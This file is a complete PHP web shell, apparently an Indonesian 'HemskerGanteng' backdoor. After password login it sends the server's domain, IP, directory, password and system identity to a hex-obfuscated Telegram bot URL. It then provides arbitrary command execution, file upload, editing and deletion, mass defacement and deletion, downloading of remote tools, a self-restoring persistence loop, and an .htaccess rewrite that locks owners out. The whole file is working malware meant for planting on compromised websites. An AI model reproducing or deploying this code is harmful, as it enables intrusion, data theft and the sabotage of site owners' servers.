<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);

$pw = '$2y$10$BtdjZ7dwlRNKoMoBUDp4m.rtDjnBNJ/HSQhdRWD3qAp.T9hSbYGIC';

function gets($url, $d) {

     
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($d));
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		$out = curl_exec($ch);
		$statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
		if($statusCode == 200) {
				$output = $out;
		}else {
				echo "cURL error: " . curl_error($ch);
		}
		curl_close($ch);

        return $output;
}

if (!isset($_SESSION['seslog']) && function_exists('password_verify') && isset($_POST['pass']) && $_POST['pass'] && password_verify($_POST['pass'], $pw)) {
	$_SESSION['seslog'] = true;
	$id = '-5175947437';
	$ip = $_SERVER['REMOTE_ADDR'];
	$dm = $_SERVER['HTTP_HOST'];
	$url = $_SERVER['HTTP_REFERER'];
	$dir = getcwd();
	$pass = $_POST['pass'];
	
	$uname = function_exists('php_uname') ? @php_uname() : 'N/A';
	$uid = function_exists('exec') ? (@exec('id 2>/dev/null', $o) ? implode("\n", $o) : 'N/A') : 'N/A';
	
	$msg = "<b>🔥 New Shell Detected 🔥</b>\n"
    . "<b>🌐 Domain :</b> " . htmlspecialchars($dm) . "\n"
    . "<b>🌍 IP :</b> " . htmlspecialchars($ip) . "\n"
    . "<b>📁 Directory :</b> <code>" . htmlspecialchars($dir) . "</code>\n"
    . "<b>🔗 Access :</b> " . htmlspecialchars($url) . "\n"
    . "<b>🔑 Password :</b> <code>" . htmlspecialchars($pass) . "</code>\n"
    . "<b>💻 Uname :</b> \n<pre>" . htmlspecialchars($uname) . "</pre>\n"
    . "<b>👤 ID :</b> \n<pre>" . htmlspecialchars($uid) . "</pre>\n";

	$data = [
		'chat_id' => $id, 
		'text' => $msg, 
		'parse_mode' => 'HTML'
	];
	gets(hex2bin("68747470733a2f2f6170692e74656c656772616d2e6f72672f626f74363138343237303534353a4141474768694c595f38706433772d7a44754d423058344838377337725937565152512f73656e644d657373616765"), $data);
}

if (!isset($_SESSION['seslog'])) {
	if (isset($_POST['pass']) && !$_POST['pass']) echo '<div class="container py-2 col-md-7"><div class="alert alert-warning alert-dismissible fade show"><strong>Error!!</strong> Form Can\'t be Empty<button type="button" class="btn-close" data-bs-dismiss="alert"></button></div></div>';
	elseif (isset($_POST['pass'])) echo '<div class="container py-2 col-md-7"><div class="alert alert-danger alert-dismissible fade show"><strong>Error!!</strong> invalid Password<button type="button" class="btn-close" data-bs-dismiss="alert"></button></div></div>';
	elseif (!function_exists('password_verify')) echo '<div class="container py-2 col-md-7"><div class="alert alert-warning alert-dismissible fade show"><strong>Error!!</strong> password_hash not supported, Please Upgrade PHP version<button type="button" class="btn-close" data-bs-dismiss="alert"></button></div></div>';
	
	echo "<form method='POST'><input type='password' name='pass' style='outline: none; border: 0'></form>";
exit();
}
?>
<?php
set_time_limit(0);
error_reporting(0);
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('display_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
date_default_timezone_set("Asia/Jakarta");

function uhx($sky) {
	$str = '';
	for ($i = 0; $i < strlen($sky) - 1; $i += 2) {
		$str .= chr(hexdec($sky[$i] . $sky[$i + 1]));
	}
	return $str;
}

function hx($sky) {
	$str = '';
	for ($i = 0; $i < strlen($sky); $i++) {
		$str .= dechex(ord($sky[$i]));
	}
	return $str;
}

function wr($dark, $prm) {
	return (!is_writable($dark)) ? "<font color=\"#DC4C64\">" . $prm . "</font>" : "<font color=\"#5cb85c\">" . $prm . "</font>";
}

if (isset($_GET['x']) && !empty($_GET['x'])) {
	$dark = uhx($_GET['x']);
	chdir($dark);
} else {
	$dark = getcwd();
}

$dark = str_replace('\\', '/', $dark);
$darks = explode('/', $dark);
$darkx = scandir($dark);
$cpr = '<center><hr width="20%"><span class="badge text-bg-light border-radius-0">~ HemskerGanteng - '.$_SERVER['HTTP_HOST'].'</span></center>';
function pall($dark) {
	$prm = fileperms($dark);
	if (($prm & 0xC000) == 0xC000) {
		$inf = 's';
	} elseif (($prm & 0xA000) == 0xA000) {
		$inf = 'l';
	} elseif (($prm & 0x8000) == 0x8000) {
		$inf = '-';
	} elseif (($prm & 0x6000) == 0x6000) {
		$inf = 'b';
	} elseif (($prm & 0x4000) == 0x4000) {
		$inf = 'd';
	} elseif (($prm & 0x2000) == 0x2000) {
		$inf = 'c';
	} elseif (($prm & 0x1000) == 0x1000) {
		$inf = 'p';
	} else {
		$inf = 'u';
	}

	$inf .= (($prm & 0x0100) ? 'r' : '-');
	$inf .= (($prm & 0x0080) ? 'w' : '-');
	$inf .= (($prm & 0x0040) ?
	(($prm & 0x0800) ? 's' : 'x' ) :
	(($prm & 0x0800) ? 'S' : '-'));

	$inf .= (($prm & 0x0020) ? 'r' : '-');
	$inf .= (($prm & 0x0010) ? 'w' : '-');
	$inf .= (($prm & 0x0008) ?
	(($prm & 0x0400) ? 's' : 'x' ) :
	(($prm & 0x0400) ? 'S' : '-'));

	$inf .= (($prm & 0x0004) ? 'r' : '-');
	$inf .= (($prm & 0x0002) ? 'w' : '-');
	$inf .= (($prm & 0x0001) ?
	(($prm & 0x0200) ? 't' : 'x' ) :
	(($prm & 0x0200) ? 'T' : '-'));

	return $inf;
}

function unzipdir($source) {
	$zip = new ZipArchive();
	if ($zip->open($source) === true) {
		$name = basename($source, '.zip');
		@$zip->extractTo($name);
		return @$zip->close();
	} else {
		return false;
	}
}

function unzip($source, $destination) {
	$zip = new ZipArchive();
	if ($zip->open($source) === true) {
		@$zip->extractTo($destination);
		return @$zip->close();
	} else {
		return false;
	}
}

function ext($path) {
	
	$ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));

	switch ($ext) {
		case 'ico':
		case 'gif':
		case 'jpg':
		case 'jpeg':
		case 'jpc':
		case 'jp2':
		case 'jpx':
		case 'xbm':
		case 'wbmp':
		case 'png':
		case 'bmp':
		case 'tif':
		case 'tiff':
		case 'webp':
		case 'avif':
		case 'svg':
			$icon = 'bi bi-file-earmark-image text-success';
			break;
		case 'passwd':
		case 'ftpquota':
		case 'sql':
		case 'js':
		case 'ts':
		case 'jsx':
		case 'tsx':
		case 'hbs':
		case 'json':
		case 'sh':
		case 'config':
		case 'twig':
		case 'tpl':
		case 'md':
		case 'gitignore':
		case 'c':
		case 'cpp':
		case 'cs':
		case 'py':
		case 'rs':
		case 'map':
		case 'lock':
		case 'dtd':
		case 'ps1':
		case 'exe':
		case 'msi':
			$icon = 'bi bi-file-code class-secondary';
			break;
		case 'txt':
		case 'ini':
		case 'conf':
		case 'log':
		case 'yaml':
		case 'yml':
		case 'toml':
		case 'tmp':
		case 'top':
		case 'bot':
		case 'dat':
		case 'bak':
		case 'htpasswd':
		case 'pl':
		case 'csv':
			$icon = 'bi bi-file-earmark-text text-warning';
			break;
		case 'css':
		case 'less':
		case 'sass':
		case 'scss':
			$icon = 'bi bi-filetype-css text-primary';
			break;
		case 'sql':
			$icon = 'bi bi-database';
			break;
		case 'htaccess':
			$icon = 'bi bi-braces-asterisk text-danger';
			break;
		case 'bz2':
		case 'tbz2':
		case 'tbz':
		case 'zip':
		case 'rar':
		case 'gz':
		case 'tgz':
		case 'tar':
		case '7z':
		case 'xz':
		case 'txz':
		case 'zst':
		case 'tzst':
			$icon = 'bi bi-file-earmark-zip text-warning';
			break;
		case 'php':
		case 'php4':
		case 'php5':
		case 'phps':
		case 'phtml':
			$icon = 'bi bi-filetype-php text-success';
			break;
		case 'htm':
		case 'html':
		case 'shtml':
		case 'xhtml':
			$icon = 'bi bi-filetype-html text-success';
			break;
		case 'xml':
		case 'xsl':
			$icon = 'bi bi-filetype-xml';
			break;
		case 'wav':
		case 'mp3':
		case 'mp2':
		case 'm4a':
		case 'aac':
		case 'ogg':
		case 'oga':
		case 'wma':
		case 'mka':
		case 'flac':
		case 'ac3':
		case 'tds':
			$icon = 'bi bi-file-earmark-music';
			break;
		case 'm3u':
		case 'm3u8':
		case 'pls':
		case 'cue':
		case 'xspf':
			$icon = 'bi bi-headphones';
			break;
		case 'avi':
		case 'mpg':
		case 'mpeg':
		case 'mp4':
		case 'm4v':
		case 'flv':
		case 'f4v':
		case 'ogm':
		case 'ogv':
		case 'mov':
		case 'mkv':
		case '3gp':
		case 'asf':
		case 'wmv':
		case 'webm':
			$icon = 'bi bi-file-earmark-play';
			break;
		case 'eml':
		case 'msg':
			$icon = 'bi bi-envelope';
			break;
		case 'xls':
		case 'xlsx':
		case 'ods':
			$icon = 'bi bi-file-earmark-excel';
			break;
		case 'swp':
			$icon = 'bi bi-clipboard';
			break;
		case 'doc':
		case 'docx':
		case 'odt':
			$icon = 'bi bi-file-word text-warning';
			break;
		case 'ppt':
		case 'pptx':
			$icon = 'bi bi-file-earmark-ppt';
			break;
		case 'ttf':
		case 'ttc':
		case 'otf':
		case 'woff':
		case 'woff2':
		case 'eot':
		case 'fon':
			$icon = 'bi bi-file-earmark-font';
			break;
		case 'pdf':
			$icon = 'bi bi-file-earmark-pdf text-waning';
			break;
		case 'psd':
		case 'ai':
		case 'eps':
		case 'fla':
		case 'swf':
			$icon = 'bi bi-file-earmark-image text-success';
			break;
		case 'bat':
			$icon = 'bi bi-terminal';
			break;
		default:
			$icon = 'bi bi-exclamation-circle text-warning';
	}

	return $icon;
}

function alert($m, $c, $r = false) {
	if (!empty($_SESSION["message"])) {
		unset($_SESSION["message"]);
	}
	if (!empty($_SESSION["color"])) {
		unset($_SESSION["color"]);
	}
	$_SESSION["message"] = $m;
	$_SESSION["color"] = $c;
	if ($r) {
		header('Location: ' . $r);
		exit();
	}
	return true;
}

function massdeface($dir, $file, $filename, $type = null) {
	$scandir = scandir($dir);
	foreach($scandir as $dir_) {
		$path	 = "$dir/$dir_";
		$lok = "$path/$filename";
		if($dir_ === "." || $dir_ === "..") {
			file_put_contents($lok, $file);
		}
		else {
			if(is_dir($path) AND is_writable($path)) {
				echo '[ SUCCESS ] >> '.$lok.'
';
				file_put_contents($lok, $file);
				if($type === "-alldir") {
					massdeface($path, $file, $filename, "-alldir");
				}
			}
		}
	}
}

function massdelete($dir, $filename) {
	$scandir = scandir($dir);
	foreach($scandir as $dir_) {
		$path	 = "$dir/$dir_";
		$lok = "$path/$filename";
		if($dir_ === '.') {
			if(file_exists("$dir/$filename")) {
				unlink("$dir/$filename");
			}
		} 
		elseif($dir_ === '..') {
			if(file_exists(dirname($dir)."/$filename")) {
				unlink(dirname($dir)."/$filename");
			}
		} 
		else {
			if(is_dir($path) AND is_writable($path)) {
				if(file_exists($lok)) {
					echo '[ DELETED] >> '.$lok.'
';
					unlink($lok);
					massdelete($path, $filename);
				}
			}
		}
	}
}
 
function clear() {
	if (!empty($_SESSION["message"])) {
		unset($_SESSION["message"]);
	}
	if (!empty($_SESSION["color"])) {
		unset($_SESSION["color"]);
	}
	return true;
}

function rut($set,$sad) {
	$x = "preg_match";
	$xx = "2>&1";
	if (!$x("/".$xx."/i", $set)) {
		$set = $set." ".$xx;
	}
	$a = "function_exists";
	$b = "proc_open";
	$c = "htmlspecialchars";
	$d = "stream_get_contents";
	if ($a($b)) {
		$ps = $b($set, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pink,$sad);
		return $d($pink[1]);
	} else {
		return "proc_open function is disabled!";
	}
}

function cmd($in, $re = false) {
	$out = '';
	try {
		if ($re) $in = $in . " 2>&1";
		if (function_exists("exec")) {
			@exec($in, $out);
			$out = @join("\n", $out);
		} elseif (function_exists("passthru")) {
			ob_start();
			@passthru($in);
			$out = ob_get_clean();
		} elseif (function_exists("system")) {
			ob_start();
			@system($in);
			$out = ob_get_clean();
		} elseif (function_exists("shell_exec")) {
			$out = shell_exec($in);
		} elseif (function_exists("popen") && function_exists("pclose")) {
			if (is_resource($f = popen($in, "r"))) {
				$out = "";
				while (!@feof($f))
					$out .= fread($f, 1024);
				pclose($f);
			}
		} elseif (function_exists("proc_open")) {
			$pipes = array();
			$process = proc_open($in . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
			$out = streamgetcontents($pipes[1]);
		}
	} catch (Exception $e) {
	}
	return $out;
}

function np($value){
	$nM = $value;
	$ex = pathinfo($value, PATHINFO_EXTENSION);
	if (strlen($nM) > 30) {
		return substr($nM, 0, 30) . "...";
	} else {
		return $value;
	}
}

function sall($item) {
	$a	= ["Byte", "KB", "MB", "GB", "TB", "PB"];
	$pos = 0;
	$sall = filesize($item);
	while ($sall >= 1024) {
		$sall /= 1024;
		$pos++;
	}
	return round($sall, 2) . " <b style=\"color:#5cb85c\">" . $a[$pos];
}

function fSize($byt) {
	$typ = ['Byte', 'KB', 'MB', 'GB', 'TB'];
	for (
		$i = 0;
		$byt >= 1024 && $i < count($typ) - 1;
		$byt /= 1024, $i++
	);
	return round($byt, 2) . " " . $typ[$i];
}

function hdd($type = null) {
	switch ($type) {
		case 'free':
			return fSize(disk_free_space($_SERVER['DOCUMENT_ROOT']));
			break;
		case 'total':
			return fSize(disk_total_space($_SERVER['DOCUMENT_ROOT']));
			break;
		case 'used':
			$free = disk_free_space($_SERVER['DOCUMENT_ROOT']);
			$total = disk_total_space($_SERVER['DOCUMENT_ROOT']);
			$used = $total - $free;
			return fSize($used);
			break;
	}
}

function remove_dot($file) {
	$FILES = $file;
	$pch = explode(".", $FILES);
	return $pch[0];
}

function unlinkDir($dir) {
	$dirs = array($dir);
	$files = array();
	for ($i = 0;; $i++) {
		if (isset($dirs[$i]))
			$dir = $dirs[$i];
		else
			break;
		if ($openDir = opendir($dir)) {
			while ($readDir = @readdir($openDir)) {
				if ($readDir != "." && $readDir != "..") {

					if (is_dir($dir . "/" . $readDir)) {
						$dirs[] = $dir . "/" . $readDir;
					} else {

						$files[] = $dir . "/" . $readDir;
					}
				}
			}
		}
	}
	foreach ($files as $file) {
		unlink($file);
	}
	$dirs = array_reverse($dirs);
	foreach ($dirs as $dir) {
		rmdir($dir);
	}
}

function getProcessList() {
	$prcs = array();
		$output = cmd('ps aux');
		$lines = explode("\n", $output);
		array_shift($lines); 

		foreach ($lines as $line) {
			if (empty($line)) continue;
			$parts = preg_split('/\s+/', $line);
			if (count($parts) < 11) continue;

			$prc = array(
				'user' => $parts[0],
				'pid' => $parts[1],
				'cpu' => $parts[2],
				'mem' => $parts[3],
				'command' => implode(' ', array_slice($parts, 10))
			);
			$prcs[] = $prc;
		}
	return $prcs;
}

try {
	if (isset($_GET['act']) && $_GET['act'] == 'df') {
		ob_clean();
		$a = uhx($_GET['item']);
		$fp = realpath($a);
		if ($fp && file_exists($fp) && is_readable($fp)) {
			header('Content-Description: File Transfer');
			header('Content-Type: application/octet-stream');
			header('Content-Disposition: attachment; filename="' . basename($fp) . '"');
			header('Expires: 0');
			header('Cache-Control: must-revalidate');
			header('Pragma: public');
			header('Content-Length: ' . filesize($fp));
			readfile($fp);
			exit();
		} else {
			throw new Exception("download $item");
		}
	}
} catch (Exception $e) {
	alert("Error!! " . $e->getMessage(), "#DC4C64", "?x=" . hx($dark));
	exit();
}

if(isset($_GET['out'])) {
	unset($_SESSION['seslog']);
	header('Location: '.$_SERVER['PHP_SELF']);
}

if (isset($_GET['info'])) {
	phpinfo();
	exit();
}

if (isset($_GET['adm'])) {
	$URL = "https://pukimai1337.github.io/kebutuhan/db/adm.txt";
	if (!is_file('adminer.php')) {
		file_put_contents("adminer.php", file_get_contents($URL));
		header('Location: ?x='.hx($dark).'');
	}
}

if (isset($_GET['lockshell'])) {
	if (!function_exists("proc_open")) {
		alert("Error!! shell not Locked, Command is Disable.", "#DC4C64", "?x=" . hx($dark));
	}
		$b64_en = "base64_encode";
		$b64_de = "base64_decode";
		$curFile = trim(basename($_SERVER["SCRIPT_FILENAME"]));
		$TmpNames = sys_get_temp_dir();
	if (file_exists($TmpNames . '/.sessions/.' . $b64_en($dark . remove_dot($curFile) . '-handler')) && file_exists($TmpNames . '/.sessions/.' . $b64_en($dark . remove_dot($curFile) . '-text'))) {
		cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $b64_en($dark . remove_dot($curFile) . '-text'));
		cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $b64_en($dark . remove_dot($curFile) . '-handler'));
	}
	mkdir($TmpNames . "/.sessions");
	cmd("cp $curFile " . $TmpNames . "/.sessions/." . $b64_en($dark . remove_dot($curFile) . '-text'));
	chmod($curFile, 0444);
	$handler = '<?php
@ini_set("max_execution_time", 0);
while (True){
	if (!file_exists("' . __DIR__ . '")){
		mkdir("' . __DIR__ . '");
	}
	if (!file_exists("' . $dark . '/' . $curFile . '")){
		$text = ' . $b64_en . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $b64_en($dark . remove_dot($curFile) . '-text') . '"));
		file_put_contents("' . $dark . '/' . $curFile . '", ' . $b64_de . '($text));
	}
	if (thedark_perm("' . $dark . '/' . $curFile . '") != 0444){
		chmod("' . $dark . '/' . $curFile . '", 0444);
	}
	if (thedark_perm("' . __DIR__ . '") != 0555){
		chmod("' . __DIR__ . '", 0555);
	}
}

function thedark_perm($flename){
	return substr(sprintf("%o", fileperms($flename)), -4);
}';
	$hndlers = file_put_contents($TmpNames . "/.sessions/." . $b64_en($dark . remove_dot($curFile) . '-handler') . "", $handler);
	if ($hndlers) {
		$php = PHP_BINARY;
		if (!is_executable($php)) {
			$php = 'php';
		}
		$cmd = $php . ' ' . $TmpNames . '/.sessions/.' . $b64_en(
			$dark . remove_dot($curFile) . '-handler') . ' > /dev/null 2>/dev/null &';
			cmd($cmd);
			alert("Successfully!! shell Locked", "#5cb85c", "?x=" . hx($dark));
	} else {
		alert("Error!! shell not Locked", "#DC4C64", "?x=" . hx($dark));
	}
}

if ($_POST['lockfile'] == true) {
	if (!function_exists("proc_open")) {
		alert("Error!! file not Locked, Command is Disable.", "#DC4C64", "?x=" . hx($dark));
	}
		$b64_en = "base64_encode";
		$b64_de = "base64_decode";
		$flesName = $_POST['lockfile'];
		$TmpNames = sys_get_temp_dir();
	if (file_exists($TmpNames . '/.sessions/.' . $b64_en($dark . remove_dot($flesName) . '-handler')) && file_exists($TmpNames . '/.sessions/.' . remove_dot($flesName) . '-text')) {
		cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $b64_en($dark . remove_dot($flesName) . '-text-file'));
		cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $b64_en($dark . remove_dot($flesName) . '-handler'));
	}
		mkdir($TmpNames . "/.sessions");
		cmd("cp $flesName " . $TmpNames . "/.sessions/." . $b64_en($dark . remove_dot($flesName) . '-text-file'));
		cmd("chmod 444 " . $flesName);
	$handler = '<?php
@ini_set("max_execution_time", 0);
while (True){
	if (!file_exists("' . $dark . '")){
		mkdir("' . $dark . '");
	}
	if (!file_exists("' . $dark . '/' . $flesName . '")){
		$text = ' . $b64_en . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $b64_en($dark . remove_dot($flesName) . '-text-file') . '"));
		file_put_contents("' . $dark . '/' . $flesName . '", ' . $b64_de . '($text));
	}
	if (thedark_perm("' . $dark . '/' . $flesName . '") != 0444){
		chmod("' . $dark . '/' . $flesName . '", 0444);
	} 
	if (thedark_perm("' . $dark . '") != 0555){
		chmod("' . $dark . '", 0555);
	}
}

function thedark_perm($flename){
	return substr(sprintf("%o", fileperms($flename)), -4);
}';
	$hndlers = file_put_contents($TmpNames . "/.sessions/." . $b64_en($dark . remove_dot($flesName) . '-handler') . "", $handler);
	if ($hndlers) {
		$php = PHP_BINARY;
		if (!is_executable($php)) {
			$php = 'php';
		}
		$cmd = $php . ' ' . $TmpNames . '/.sessions/.' . $b64_en(
			$dark . remove_dot($flesName) . '-handler') . ' > /dev/null 2>/dev/null &';
			cmd($cmd);
			alert("Successfully!! file Locked", "#5cb85c", "?x=" . hx($dark));
	} else {
		alert("Error!! file not Locked", "#DC4C64", "?x=" . hx($dark));
	}
}

if (isset($_GET['unlockshell'])) {
	if (cmd("killall -9 php") && cmd("pkill -9 php")) {
		alert("Successfully!! Unlocked", "#5cb85c", "?x=" . hx($dark));
	} else {
		alert("Unlocked!! please chmod file Locked", "#f2b71f", "?x=" . hx($dark));
	}
}

if (isset($_GET['destroy'])) {
try {
	$DC_r00t = $_SERVER["DOCUMENT_ROOT"];
	$CFile = trim(basename($_SERVER["SCRIPT_FILENAME"]));
	if (is_writeable($DC_r00t)) {
		$ht = '<FilesMatch "(?i).*(ph|sh|pj|env).*">
Order Deny,Allow
Deny from all
</FilesMatch>
<Files '.$CFile.'>
Allow from all
</Files>
<Files index.php>
Allow from all
</Files>
<Files datas.php>
Allow from all
</Files>
AddType application/x-httpd-php .js
ErrorDocument 403 "<title>403</title>lagi ngapain bre"
ErrorDocument 404 "<title>404</title>lagi ngapain bre"
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^ index.php [L]
</IfModule>';
		$put_ht = file_put_contents($DC_r00t . "/.htaccess", $ht);
		if ($put_ht) {
				alert("Successfully!! htaccess destroyer", "#5cb85c", "?x=" . hx($dark));
			} else {
			throw new Exception("htaccess destroyer");
		}
	} else {
		throw new Exception("htaccess destroyer");
	}
} catch (Exception $e) {
	alert("Error!! " . $e->getMessage(), "#DC4C64", "?x=" . hx($dark));
	exit();
	}
}

if (isset($_POST['nfoln'])){
	try {
		$nfn = $_POST['nfoln'];
		$nfp = $dark . '/' . $nfn;
		if (!file_exists($nfp) && mkdir($nfp)) {
			alert("Successfully!! make a folder $nfn", "#5cb85c", "?x=" . hx($dark));
		} else {
			throw new Exception("while creating folder $nfn");
		}
	} catch (Exception $e) {
		alert("Error!! " . $e->getMessage(), "#DC4C64", "?x=" . hx($dark));
		exit();
	}
}

if (isset($_POST['nfn'])) {
	try {
		$nfn = $_POST['nfn'];
		$nfp = $dark . '/' . $nfn;
		if (!file_exists($nfp)) {
			if (isset($_POST['nfc'])) {
				$nfc = $_POST['nfc'];
				if (file_put_contents($nfp, $nfc) !== false) {
					alert("Successfully!! make a file $nfn", "#5cb85c", "?x=" . hx($dark));
				} else {
					throw new Exception("Error while creating file $nfn");
				}
			} else {
				if (touch($nfp)) {
					alert("Successfully!! make a file $nfn", "#5cb85c", "?x=" . hx($dark));
				} else {
					throw new Exception("while creating file $nfn");
				}
			}
		} else {
			throw new Exception("$nfn already exists");
		}
	} catch (Exception $e) {
		alert("Error!! " . $e->getMessage(), "#DC4C64", "?x=" . hx($dark));
		exit();
	}
}

if (isset($_POST['ri']) && isset($_POST['nn'])) {
	try {
		if ($_POST['nn'] == '') {
			throw new Exception("input cannot be empty");
		} else {
			$item = $_POST['ri'];
			$new = $_POST['nn'];
			$nfp = $dark . '/' . $new;
			if (file_exists($item)) {
				if (rename($item, $nfp)) {
					alert("Successfully!! rename $item to $new", "#5cb85c", "?x=" . hx($dark));
				} else {
					throw new Exception("while renaming $item");
				}
			} else {
				throw new Exception("$item not found");
			}
		}
	} catch (Exception $e) {
		alert("Error!! " . $e->getMessage(), "#DC4C64", "?x=" . hx($dark));
		exit();
	}
}

if (isset($_GET['item']) && isset($_POST['nc'])) {
	try {
		$item = uhx($_GET['item']);
		if (file_put_contents($dark . '/' . $item, $_POST['nc']) !== false) {
			alert("Successfully!! editing $item", "#5cb85c", "?x=" . hx($dark));
		} else {
			throw new Exception("while editing $item");
		}
	} catch (Exception $e) {
		alert("Error!! " . $e->getMessage(), "#DC4C64", "?x=" . hx($dark));
		exit();
	}
}

if (isset($_POST['di']) && isset($_POST['nd'])) {
	try {
		$ndf = strtotime($_POST['nd']);
		$item = $_POST['di'];
		if ($ndf == '') {
			throw new Exception("input cannot be empty");
		}
		if (touch($dark . '/' . $item, $ndf)) {
			alert("Successfully!! change date for $item", "#5cb85c", "?x=" . hx($dark));
		} else {
			throw new Exception("while change date for $item");
		}
	} catch (Exception $e) {
		alert("Error!! " . $e->getMessage(), "#DC4C64", "?x=" . hx($dark));
		exit();
	}
}

if (isset($_POST['pi']) && isset($_POST['np'])) {
	try {
		$item = $_POST['pi'];
		if ($_POST['np'] == '') {
			throw new Exception("input cannot be empty");
		}
		if (chmod($dark . '/'. $item, intval($_POST['np'], 8))) {
			alert("Successfully!! change permission for $item", "#5cb85c", "?x=" . hx($dark));
		} else {
			throw new Exception("while change permission for $item");
		}
	} catch (Exception $e) {
		alert("Error!! " . $e->getMessage(), "#DC4C64", "?x=" . hx($dark));
		exit();
	}
}

if (isset($_POST['dl'])){
	$item = $_POST['dl'];
	try {
		if (!is_writable($item)) {
			throw new Exception("Permission denied for $item");
		}
		if (is_file($item)) {
			if (!unlink($item)) {
				throw new Exception("Failed to file: $item");
			}
			alert("Successfully!! delete file $item", "#5cb85c", "?x=" . hx($dark));
		} elseif (is_dir($item)) {
			if (!unlinkDir($item)) {
				alert("Successfully!! delete folder $item", "#5cb85c", "?x=" . hx($dark));
			}
			throw new Exception("Failed to folder: $item");
		} else {
			throw new Exception("$item not found");
		}
	} catch (Exception $e) {
		alert("Error!! " . $e->getMessage(), "#DC4C64", "?x=" . hx($dark));
		exit();
	}
}

if (isset($_FILES['z'])) {
	try {
		$total = count($_FILES['z']['name']);
		for ($i = 0; $i < $total; $i++) {
			$mu = move_uploaded_file($_FILES['z']['tmp_name'][$i], $_FILES['z']['name'][$i]);
		}
		if ($total < 2) {
			if ($mu) {
				$fn = $_FILES['z']['name'][0]; 
				alert("Upload $fn successfully! ", "#5cb85c", "?x=" . hx($dark));
			} else {
				throw new Exception("while upload $fn");
			}
		} else {
			if ($mu) {
				alert("Upload $i files successfully! ", "#5cb85c", "?x=" . hx($dark));
			} else {
				throw new Exception("while upload files");
			}
		}
	} catch (Exception $e) {
		alert("Error!! " . $e->getMessage(), "#DC4C64", "?x=" . hx($dark));
		exit();
	}
}

if ($_POST['unzip']) {
	$zip = basename($_POST['file_zip']);
	if (unzip($zip, $dark)) {
		alert("Unzip " . $zip . " successfully!! ", "#5cb85c", "?x=" . hx($dark));
	} else {
		alert("Unzip " . $zip . " failed!! ", "#DC4C64", "?x=" . hx($dark));
	}
}

if ($_POST['unzipdir']) {
	$zip_dir = basename($_POST['zip_dir']);
	if (unzipdir($zip_dir, $dark)) {
		alert("Unzip " . $zip_dir . " successfully!! ", "#5cb85c", "?x=" . hx($dark));
	} else {
		alert("Unzip " . $zip_dir . " failed!! ", "#DC4C64", "?x=" . hx($dark));
	}
}

if (isset($_POST['thelink'])) {
	if (empty($_POST['namelink'])) {
		alert("Filename cannot be empty!! ", "#DC4C64", "?x=" . hx($dark));
	}
	$data = @file_put_contents($dark."/".$_POST['namelink'], @file_get_contents($_POST['darilink']));
	if (file_exists($dark."/".$_POST['namelink'])) {
		alert("File ".$_POST['namelink']." Uploaded!! ", "#5cb85c", "?x=" . hx($dark));
	} else {
		alert("Failed to Upload!! ", "#DC4C64", "?x=" . hx($dark));
	}
}

if (isset($_GET['itemscan'])) {
	header('Content-Type: text/x-php');
	echo file_get_contents(uhx($_GET['itemscan']));
	exit();
}

if (isset($_POST['pid'])) {
	if (cmd("kill ". $_POST['pid'])) {
		alert("Kill successfully! ", "#5cb85c", "?x=" . hx($dark));
	} else {
		$name = cmd("ps -p ".$pid." -o comm= 2>&1");
		if (!empty($name)) {
			$pkillOutput = cmd("pkill -9 $name 2>&1");
			alert("Kill ".$pkillOutpu." successfully! ", "#5cb85c", "?x=" . hx($dark));
		} else {
			alert("Error! Kill failed", "#DC4C64", "?x=" . hx($dark));
		}
	}
}

function win() {
	$wina = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','V','W','X','Y','Z'];
	foreach ($wina as $winb => $winc) {
		if (is_dir($winc . ":/")) {
			echo '[&nbsp;<a class="text-success" href="?x=' . hx($winc . ':/') . '">' . $winc . '</a>&nbsp;] ';
		}
	}
}

?>
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8">
		<meta name="author" content="pukimai1337@gmail.com">
		<meta content="width=device-width, initial-scale=0.7, maximum-scale=1, user-scalable=no" name="viewport">
		<title><?= $_SERVER['HTTP_HOST']; ?> - #HekerGanteng</title>
		<link href="//cdn.jsdelivr.net/npm/bootstrap@5.3.5/dist/css/bootstrap.min.css" rel="stylesheet">
		<link href="//cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
		<link href="//pukimai1337.github.io/puki/dark.css" rel="stylesheet">
		<script src="//cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
		<script src="//pukimai1337.github.io/kebutuhan/puki.js"></script> 
	</head>
<body class="bg-secondary text-light">
	<div class="container-fluid py-3">
		<div class="box shadow-sm p-3 mb-5 bg-dark rounded py-3">
			<div class="row justify-content-between align-items-center">
				<div class="table-responsive">
					<table class="table table-sm table-borderless table-dark">
						<tr>
							<td style="width: 7%;">System</td>
							<td style="width: 1%">:</td>
							<td><?= isset($_SERVER['SERVER_SOFTWARE']) ? php_uname() : "Server information not available"; ?></td>
						</tr>
						<tr>
							<td style="width: 7%;">Software</td>
							<td style="width: 1%">:</td>
							<td><?= $_SERVER['SERVER_SOFTWARE'] ?></td>
						</tr>
						<tr>
							<td style="width: 7%;">Server</td>
							<td style="width: 1%">:</td>
							<td><?= gethostbyname($_SERVER['HTTP_HOST']) ?></td>
						</tr>
						<tr>
